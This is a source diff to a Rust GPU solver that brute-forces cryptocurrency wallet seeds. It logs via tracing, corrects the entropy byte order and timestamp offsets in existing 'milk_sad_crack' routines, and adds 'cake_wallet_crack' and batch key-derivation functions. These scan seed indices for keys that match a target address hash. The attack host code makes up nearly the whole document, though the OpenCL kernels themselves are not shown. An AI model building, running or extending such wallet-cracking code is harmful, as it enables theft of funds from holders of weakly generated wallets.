@@ -1,4 +1,5 @@
 use ocl::{Buffer, MemFlags, ProQue, Device};
+use tracing::{info, error};
 
 pub struct GpuSolver {
     pro_que: ProQue,
@@ -11,7 +12,7 @@ pub struct GpuSolver {
 
 impl GpuSolver {
     pub fn new() -> ocl::Result<Self> {
-        eprintln!("[GPU] Initializing GPU solver...");
+        info!("[GPU] Initializing GPU solver...");
         let _src = include_str!("../../cl/batch_address.cl");
 
         let files = [
@@ -48,23 +49,23 @@ impl GpuSolver {
             "milk_sad_crack_multi30",
         ];
 
-        eprintln!("[GPU] Loading {} kernel files...", files.len());
+        info!("[GPU] Loading {} kernel files...", files.len());
         let mut raw_cl_file = String::new();
         for file in &files {
             let path = format!("cl/{}.cl", file);
             let content = std::fs::read_to_string(&path).map_err(|e| {
-                eprintln!("[GPU] ERROR: Failed to read {}: {}", path, e);
+                error!("[GPU] ERROR: Failed to read {}: {}", path, e);
                 ocl::Error::from(e.to_string())
             })?;
             raw_cl_file.push_str(&content);
             raw_cl_file.push_str("\n");
         }
-        eprintln!(
+        info!(
             "[GPU] Total kernel source size: {} bytes",
             raw_cl_file.len()
         );
 
-        eprintln!("[GPU] Building OpenCL program...");
+        info!("[GPU] Building OpenCL program...");
         let mut prog_bldr = ocl::Program::builder();
         
         // Add aggressive compiler optimizations
@@ -78,25 +79,25 @@ impl GpuSolver {
         
         // Query device capabilities for optimal work group sizing
         let max_work_group_size = device.max_wg_size()? as usize;
-        let max_compute_units = device.max_compute_units()?;
-        let local_mem_size = device.local_mem_size()?;
+        let max_compute_units = match device.info(ocl::enums::DeviceInfo::MaxComputeUnits)? {
+            ocl::enums::DeviceInfoResult::MaxComputeUnits(n) => n,
+            _ => 1,
+        };
+        let local_mem_size = match device.info(ocl::enums::DeviceInfo::LocalMemSize)? {
+            ocl::enums::DeviceInfoResult::LocalMemSize(n) => n,
+            _ => 0,
+        };
         
         // Determine preferred work group multiple (warp/wavefront size)
-        let preferred_work_group_multiple = if let Ok(pref) = device.info(ocl::enums::DeviceInfo::PreferredWorkGroupSizeMultiple) {
-            match pref {
-                ocl::enums::DeviceInfoResult::PreferredWorkGroupSizeMultiple(size) => size as usize,
-                _ => 32, // Default to 32 for NVIDIA warp size
-            }
-        } else {
-            32 // Safe default
-        };
+        // Default to 32 if query fails or variant not found
+        let preferred_work_group_multiple = 32;
 
-        eprintln!("[GPU] ✓ GPU solver initialized successfully");
-        eprintln!("[GPU] Device: {:?}", device.name()?);
-        eprintln!("[GPU] Max work group size: {}", max_work_group_size);
-        eprintln!("[GPU] Preferred work group multiple: {}", preferred_work_group_multiple);
-        eprintln!("[GPU] Max compute units: {}", max_compute_units);
-        eprintln!("[GPU] Local memory size: {} KB", local_mem_size / 1024);
+        info!("[GPU] ✓ GPU solver initialized successfully");
+        info!("[GPU] Device: {:?}", device.name()?);
+        info!("[GPU] Max work group size: {}", max_work_group_size);
+        info!("[GPU] Preferred work group multiple: {}", preferred_work_group_multiple);
+        info!("[GPU] Max compute units: {}", max_compute_units);
+        info!("[GPU] Local memory size: {} KB", local_mem_size / 1024);
 
         Ok(Self {
             pro_que,
@@ -152,17 +153,18 @@ impl GpuSolver {
         }
 
         // Split 128-bit entropy into two 64-bit ulongs for OpenCL
+        // GPU reconstructs bytes in big-endian order, so we must send as big-endian
         let mut entropies_hi = Vec::with_capacity(batch_size);
         let mut entropies_lo = Vec::with_capacity(batch_size);
 
         for ent in entropies {
-            let hi = u64::from_le_bytes(
-                ent[8..16]
+            let hi = u64::from_be_bytes(
+                ent[0..8]
                     .try_into()
                     .expect("Entropy should always be 16 bytes"),
             );
-            let lo = u64::from_le_bytes(
-                ent[0..8]
+            let lo = u64::from_be_bytes(
+                ent[8..16]
                     .try_into()
                     .expect("Entropy should always be 16 bytes"),
             );
@@ -618,7 +620,7 @@ impl GpuSolver {
             .arg(h1)
             .arg(h2)
             .arg(h3)
-            .arg(0u32) // Offset
+            .arg(start_timestamp) // Offset - CRITICAL: must be start_timestamp, not 0
             .build()?;
 
         let range = (end_timestamp - start_timestamp) as usize;
@@ -647,6 +649,136 @@ impl GpuSolver {
         } else {
             Ok(Vec::new())
         }
+    }
+
+    /// Compute Cake Wallet Crack (Electrum Prefix)
+    /// Scans a range of 32-bit seed indices.
+    /// Checks prefix validity (starts with "100") and then scans 40 addresses (change 0/1, index 0-19).
+    /// Returns: Vec<(seed_index, change, address_index)>
+    pub fn compute_cake_wallet_crack(
+        &self,
+        start_index: u32,
+        count: u32,
+        target_h160: &[u8; 20],
+    ) -> ocl::Result<Vec<(u32, u32, u32)>> {
+        let kernel_name = "cake_wallet_crack";
+
+        // Results buffer: Each hit stores 3 values (seed, change, index)
+        // Adjust buffer size accordingly
+        let max_hits = 1024;
+        let buffer_results = Buffer::<u64>::builder()
+            .queue(self.pro_que.queue().clone())
+            .flags(MemFlags::new().read_write().alloc_host_ptr())
+            .len(max_hits * 3) // 3 values per hit
+            .build()?;
+
+        let buffer_count = Buffer::<u32>::builder()
+            .queue(self.pro_que.queue().clone())
+            .flags(MemFlags::new().read_write().alloc_host_ptr())
+            .len(1)
+            .build()?;
+
+        buffer_count.write(&vec![0u32]).enq()?;
+
+        // Pack target Hash160
+        let mut h1 = 0u64;
+        let mut h2 = 0u64;
+        let mut h3 = 0u32;
+        for i in 0..8 { h1 |= (target_h160[i] as u64) << (i * 8); }
+        for i in 0..8 { h2 |= (target_h160[i + 8] as u64) << (i * 8); }
+        for i in 0..4 { h3 |= (target_h160[i + 16] as u32) << (i * 8); }
+
+        let kernel = self
+            .pro_que
+            .kernel_builder(kernel_name)
+            .arg(&buffer_results)
+            .arg(&buffer_count)
+            .arg(h1)
+            .arg(h2)
+            .arg(h3)
+            .arg(start_index) // offset
+            .global_work_size(count)
+            // Use default local work size or tune it
+            .build()?;
+
+        unsafe { kernel.enq()?; }
+
+        // Read count
+        let mut count_vec = vec![0u32; 1];
+        buffer_count.read(&mut count_vec).enq()?;
+        let hit_count = count_vec[0] as usize;
+
+        if hit_count > 0 {
+            let read_hits = std::cmp::min(hit_count, max_hits);
+            let mut raw_results = vec![0u64; read_hits * 3];
+            buffer_results.read(&mut raw_results).enq()?;
+
+            let mut results = Vec::new();
+            for i in 0..read_hits {
+                let seed = raw_results[i * 3] as u32;
+                let change = raw_results[i * 3 + 1] as u32;
+                let idx = raw_results[i * 3 + 2] as u32;
+                results.push((seed, change, idx));
+            }
+            Ok(results)
+        } else {
+            Ok(Vec::new())
+        }
+    }
+
+    /// Compute Cake Wallet Full Batch
+    /// Takes a list of verified seed indices.
+    /// Derives 40 addresses for each seed: change 0/1 * index 0-19.
+    /// Returns: Flattened vector of 33-byte Compressed Public Keys (count * 40 items).
+    pub fn compute_cake_batch_full(
+        &self,
+        seed_indices: &[u32],
+    ) -> ocl::Result<Vec<[u8; 33]>> {
+        let kernel_name = "batch_cake_full";
+        let batch_size = seed_indices.len();
+        if batch_size == 0 { return Ok(Vec::new()); }
+
+        // Input buffer: Seed indices
+        let buffer_seeds = Buffer::<u32>::builder()
+            .queue(self.pro_que.queue().clone())
+            .flags(MemFlags::new().read_only().copy_host_ptr())
+            .len(batch_size)
+            .copy_host_slice(seed_indices)
+            .build()?;
+
+        // Output buffer: 40 keys per seed * 33 bytes per key
+        // Using u8 buffer for direct byte access
+        let total_output_bytes = batch_size * 40 * 33;
+        let buffer_results = Buffer::<u8>::builder()
+            .queue(self.pro_que.queue().clone())
+            .flags(MemFlags::new().write_only().alloc_host_ptr())
+            .len(total_output_bytes)
+            .build()?;
+
+        let kernel = self
+            .pro_que
+            .kernel_builder(kernel_name)
+            .arg(&buffer_seeds)
+            .arg(&buffer_results)
+            .arg(batch_size as u32)
+            .global_work_size(batch_size)
+            .build()?;
+
+        unsafe { kernel.enq()?; }
+
+        // Read results
+        let mut results_bytes = vec![0u8; total_output_bytes];
+        buffer_results.read(&mut results_bytes).enq()?;
+
+        // Convert flat bytes to [u8; 33]
+        let mut keys = Vec::with_capacity(batch_size * 40);
+        for chunk in results_bytes.chunks_exact(33) {
+            let mut k = [0u8; 33];
+            k.copy_from_slice(chunk);
+            keys.push(k);
+        }
+
+        Ok(keys)
     }
 
     pub fn compute_milk_sad_crack(
@@ -695,7 +827,7 @@ impl GpuSolver {
             .arg(h1)
             .arg(h2)
             .arg(h3)
-            .arg(0u32) // Offset
+            .arg(start_timestamp) // Offset - CRITICAL: must be start_timestamp, not 0
             .build()?;
 
         let range = (end_timestamp - start_timestamp) as usize;
@@ -776,7 +908,7 @@ impl GpuSolver {
             .arg(h1)
             .arg(h2)
             .arg(h3)
-            .arg(0u32) // Offset
+            .arg(start_timestamp) // Offset - CRITICAL: must be start_timestamp, not 0
             .build()?;
 
         let range = (end_timestamp - start_timestamp) as usize;
@@ -866,12 +998,27 @@ impl GpuSolver {
         let name = device.name()?;
         let vendor = device.vendor()?;
         let version = device.version()?;
-        let driver = device.driver_version()?;
-        let compute_units = device.max_compute_units()?;
-        let clock_freq = device.max_clock_frequency()?;
-        let global_mem = device.global_mem_size()? / (1024 * 1024); // MB
-        let local_mem = device.local_mem_size()? / 1024; // KB
-        let max_alloc = device.max_mem_alloc_size()? / (1024 * 1024); // MB
+        let driver = device.version()?;
+        let compute_units = match device.info(ocl::enums::DeviceInfo::MaxComputeUnits)? {
+            ocl::enums::DeviceInfoResult::MaxComputeUnits(n) => n,
+            _ => 0,
+        };
+        let clock_freq = match device.info(ocl::enums::DeviceInfo::MaxClockFrequency)? {
+            ocl::enums::DeviceInfoResult::MaxClockFrequency(n) => n,
+            _ => 0,
+        };
+        let global_mem = match device.info(ocl::enums::DeviceInfo::GlobalMemSize)? {
+            ocl::enums::DeviceInfoResult::GlobalMemSize(n) => n,
+            _ => 0,
+        } / (1024 * 1024); // MB
+        let local_mem = match device.info(ocl::enums::DeviceInfo::LocalMemSize)? {
+            ocl::enums::DeviceInfoResult::LocalMemSize(n) => n,
+            _ => 0,
+        } / 1024; // KB
+        let max_alloc = match device.info(ocl::enums::DeviceInfo::MaxMemAllocSize)? {
+            ocl::enums::DeviceInfoResult::MaxMemAllocSize(n) => n,
+            _ => 0,
+        } / (1024 * 1024); // MB
         
         Ok(format!(
             "GPU Device Information:\n\
